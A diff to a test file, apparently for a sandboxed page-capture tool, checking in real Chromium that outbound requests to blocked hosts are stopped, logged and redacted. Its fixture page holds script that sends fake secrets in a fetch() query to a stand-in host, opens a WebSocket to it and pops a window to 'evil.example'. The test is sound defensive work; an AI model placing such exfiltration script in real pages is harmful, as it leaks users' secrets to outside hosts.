@@ -35,7 +35,7 @@ beforeAll(async () => {
 <img src="/ok.png">
 <script>
 fetch("http://not-allowed.example/api?api_key=${SECRETS.key}&page=${SECRETS.plain}").catch(()=>{});
-try { new WebSocket("ws://demo.local:${port}/ws"); } catch (e) {}
+try { new WebSocket("ws://not-allowed.example:${port}/ws"); } catch (e) {}
 setTimeout(() => window.open("http://evil.example/popup"), 10);
 </script>`);
     if (req.url === "/rtc") return html(`<h1>rtc page</h1><p id="r">rtc:pending</p><iframe srcdoc="<p>child</p>"></iframe><script>
@@ -86,7 +86,7 @@ async function planned(core: WalkthroughCore) {
 }
 
 describe("capture_page blocks every bypass (real Chromium)", () => {
-  it.skipIf(!hasChromium)("img/script to metadata+private IPs, iframe, window.open, WebSocket, redirect to blocked host, userinfo: blocked + recorded + redacted", async () => {
+  it.skipIf(!hasChromium)("img/script to metadata+private IPs, iframe, window.open, non-allowlisted WebSocket, redirect to blocked host, userinfo: blocked + recorded + redacted", async () => {
     // Known fake secrets go into the Redactor (as a deployment would configure them). SECRETS.plain is deliberately
     // NOT: it must still be masked because every query value of a blocked URL is treated as a secret.
     const { core, root } = mk(async () => "127.0.0.1", [], [SECRETS.q, SECRETS.key, SECRETS.pw, SECRETS.lf]);
